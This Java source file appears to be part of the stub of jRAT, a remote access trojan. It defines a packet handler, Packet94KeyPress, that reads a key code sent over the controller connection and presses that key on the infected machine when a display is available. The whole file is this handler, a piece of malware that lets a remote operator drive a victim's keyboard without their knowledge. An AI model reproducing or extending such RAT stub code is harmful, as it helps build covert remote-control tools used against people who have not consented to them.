package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.utils.ScreenUtils;

public class Packet94KeyPress extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		int btn = Connection.instance.readInt();

		if (!ScreenUtils.isHeadless()) {
			ScreenUtils.getDefault().keyPress(btn);
		}
	}

}
